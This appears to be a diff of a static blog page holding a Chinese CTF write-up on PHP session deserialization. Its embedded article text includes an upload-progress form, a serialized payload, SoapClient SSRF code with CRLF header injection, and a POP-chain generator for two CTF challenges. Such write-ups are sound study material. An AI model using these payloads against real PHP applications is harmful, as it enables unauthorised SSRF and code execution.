@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>php session反序列化 | ch3n9w の 超元域</title>
 <meta name="keywords" content="">
 <meta name="description" content="php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:">
 <meta name="author" content="ch3n9w">
-<link rel="canonical" href="//localhost:1313/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="canonical" href="http://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
-<link rel="icon" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/flash.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/flash.ico">
-<link rel="apple-touch-icon" href="//localhost:1313/flash.ico">
-<link rel="mask-icon" href="//localhost:1313/flash.ico">
+<link rel="icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="apple-touch-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
+<link rel="mask-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="//localhost:1313/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<link rel="alternate" hreflang="en" href="http://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,7 +55,71 @@
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="php session反序列化" />
+<meta property="og:description" content="php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-09-02T13:40:59+00:00" />
+<meta property="article:modified_time" content="2019-09-02T13:40:59+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="php session反序列化"/>
+<meta name="twitter:description" content="php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://ch3n9w.cpolar.cn/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "php session反序列化",
+      "item": "http://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "php session反序列化",
+  "name": "php session反序列化",
+  "description": "php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:\nsession反序列化漏洞 特征 phpinfo中默认的session.serialize_handler和本地的值不一样 ini_set(‘session.serialize_handler’, ‘php’);之类的 phpinfo中session.upload_progress.enabled打开 一旦发现脚本中的序列化处理器和php.ini设置的不一样,就可能导致这个漏洞.\nphp 的 session 都是以文件的形式进行存储的, 常见的位置如下\n/var/lib/php/sess_xxxxx /var/lib/php/sessions/sess_xxxxx /tmp/sess_xxxxx /tmp/sessions/sess_xxxxx php用于存取session时候的三种处理器\nphp:键名 ＋ 竖线 ＋ 序列化字符串 php_binary: 键名的长度对应的 ASCII 字符 ＋ 键名 ＋序列化字符串 php_serialize: 序列化字符串 在没有对session进行配置的情况下, 默认使用php序列化处理模式.\n如果以php_serialize 方式存取但是又用php处理器去处理, 那么只要传入的字符串中有 | 就可以导致php处理器将 | 前的东东解释成键, 而将后面的东西解释称值, 而后面的东西一般就是要反序列化的字符串了.\nphp5.6.13版本以前是第一个变量解析错误注销第一个变量，然后解析第二个变量，但是5.6.13以后如果第一个变量错误，直接销毁整个session, 所以这个洞要看版本\n将payload传入session的方式有两种, 一种是对面开放本地可控的数据, 另一种是因为配置不当造成session可控\n当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$SESSION中。\n_当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时， 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。\n上传表单\n\u003cform action=\"http://web.jarvisoj.com:32784/index.php\" method=\"POST\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /\u003e \u003cinput type=\"file\" name=\"file\" /\u003e \u003cinput type=\"submit\" /\u003e \u003c/form\u003e 其中目标网址需要替换, php_session_upload_progress是session.upload_progress.name的名字, 从phpinfo中看.\n然后随便传点什么进去. 在burpsuite中做如下修改\n将随便传的文件的filename成payload, 比如\n|O:5:\\\"OowoO\\\":1:{s:4:\\\"mdzz\\\";s:36:\\\"print_r(scandir(dirname(__FILE__)));\\\";} 这里的斜杆是为了防止转义.签名的竖线就是帮助php处理器解释使用的.\n例题LCTF2018-bestphp’s revenge 题目直接给出了源代码\n\u003c?php highlight_file(__FILE__); $b = 'implode'; call_user_func($_GET['f'], $_POST); session_start(); if (isset($_GET['name'])) { $_SESSION['name'] = $_GET['name']; } var_dump($_SESSION); $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); ?\u003e 整理一下\ncall_user_func: 第一个参数是回调函数的名字,第二个之后的参数是回调函数的参数,特别的,如果传入的是一个数组的话,他会将数组的第一项识别为类和对象,并将之后的参数作为类和对象的方法来调用.\nreset会将数组的第一项作为字符串输出\nimplode 函数只是合并数组的时候插入一些给定字符而已,无关紧要.\n扫描目录发现了flag.php\nsession_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){ $_SESSION['flag'] = $flag; } only localhost can get flag! 规定localhost访问,那么必须要找到ssrf的机会.\n题目提示反序列化,但是题目源码中没有任何给定的类,在此情况下只能考虑php的原生类.本题采用的是SoapClient类.在这个类的对象调用未知的方法时候就会调用call函数,同时触发请求,这个类支持http/https, 简单的使用实例如下:\n\u003c?php $url = \"http://127.0.0.1:12334/flag.php\"; $b = new SoapClient(null, array('uri' =\u003e $url, 'location' =\u003e$url)); $a = serialize($b); $c = unserialize($a); $c-\u003ea(); ?\u003e nc 接受:\n那么可以这样子:\ncall_user_func(‘session_start’,‘serialize_handler=php_serialize’)提前开启php session并规定好本地的serialize_handler为php_serialize, 而默认的session序列化处理器为php,这就会导致上面说到的session反序列化漏洞.当然,name的值是竖线加上SoapClient序列化字符串,uri和location的值都指向flag.php session存取完成之后就要想办法去反序列化和触发未知方法,这里使用变量覆盖(extract)将b覆盖为call_user_func,因为b有机会接受session反序列化的字符串,并将数组传入b中,调用welcome_to_the_lctf2018方法,从而触发call函数,造成ssrf 最后ssrf的结果也会存放在sessoin中,所以获取SoapClient的PHPSSID并去访问index.php(里面有var_dump(session))得到flag SWPUCTF 2019 web6 前面部分省略, 来到源码部分\n\u003c?php ini_set('session.serialize_handler', 'php'); class aa { public $mod1; public $mod2; public function __call($name,$param) { if($this-\u003e{$name}) { $s1 = $this-\u003e{$name}; $s1(); } } public function __get($ke) { return $this-\u003emod2[$ke]; } } class bb { public $mod1; public $mod2; public function __destruct() { $this-\u003emod1-\u003etest2(); } } class cc { public $mod1; public $mod2; public $mod3; public function __invoke() { $this-\u003emod2 = $this-\u003emod3.$this-\u003emod1; } } class dd { public $name; public $flag; public $b; public function getflag() { session_start(); var_dump($_SESSION); $a = array(reset($_SESSION),$this-\u003eflag); echo call_user_func($this-\u003eb,$a); } } class ee { public $str1; public $str2; public function __toString() { $this-\u003estr1-\u003e{$this-\u003estr2}(); return \"1\"; } } $a = $_POST['aa']; unserialize($a); ?\u003e ssrf生成session反序列化\n\u003c?php $target = 'http://127.0.0.1/interface.php'; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: user=xZmdm9NxaQ==', ); $b = new SoapClient(null, array('location' =\u003e $target, 'user_agent'=\u003e'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers),'uri'=\u003e'aabb')); $a = serialize($b); $a = str_replace('^^', \"\\r\\n\", $a); echo $a; // echo urlencode($a); 序列化生成, 触发反序列化后进而触发session的反序列化\n$first = new bb(); $second = new aa(); $third = new cc(); $four = new ee(); $first -\u003emod1 = $second; $third -\u003e mod1 = $four; $f = new dd(); $f-\u003eflag='Get_flag'; $f-\u003eb='call_user_func'; $four -\u003e str1 = $f; $four -\u003e str2 = \"getflag\"; $second -\u003emod2['test2'] = $third; echo serialize($first); PHPSESSID随便指定写一个比如kk默认情况下会生成sess_kk session文件\n参考\nhttps://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/\nhttp://www.91ri.org15925.html\nhttps://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO\nhttps://blog.spoock.com/2016/10/16/php-serialize-problem/\nhttps://www.freebuf.com/vuls/202819.html\n",
+  "wordCount" : "369",
+  "inLanguage": "en",
+  "datePublished": "2019-09-02T13:40:59Z",
+  "dateModified": "2019-09-02T13:40:59Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch3n9w"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://ch3n9w.cpolar.cn/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch3n9w の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://ch3n9w.cpolar.cn/flash.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -73,8 +137,8 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="//localhost:1313/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
-                <img src="//localhost:1313/sabito.jpg" alt="" aria-label="logo"
+            <a href="http://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
+                <img src="http://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                     height="35">ch3n9w の 超元域</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
@@ -101,7 +165,7 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="//localhost:1313/categories/" title="categories">
+                <a href="http://ch3n9w.cpolar.cn/categories/" title="categories">
                     <span>categories</span>
                 </a>
             </li>
@@ -112,7 +176,7 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="//localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="//localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="http://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="http://ch3n9w.cpolar.cn/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       php session反序列化
     </h1>
@@ -364,12 +428,12 @@ php_serialize: 序列化字符串
     <ul class="post-tags">
     </ul>
 <nav class="paginav">
-  <a class="prev" href="//localhost:1313/posts/ctf-bytectf2019/">
+  <a class="prev" href="http://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/">
     <span class="title">« Prev</span>
     <br>
     <span>bytectf2019</span>
   </a>
-  <a class="next" href="//localhost:1313/posts/tech-openssl/">
+  <a class="next" href="http://ch3n9w.cpolar.cn/posts/tech-openssl/">
     <span class="title">Next »</span>
     <br>
     <span>证书相关</span>
@@ -381,7 +445,7 @@ php_serialize: 序列化字符串
     </main>
     
 <footer class="footer">
-    <span>&copy; 2024 <a href="//localhost:1313/">ch3n9w の 超元域</a></span>
+    <span>&copy; 2024 <a href="http://ch3n9w.cpolar.cn/">ch3n9w の 超元域</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
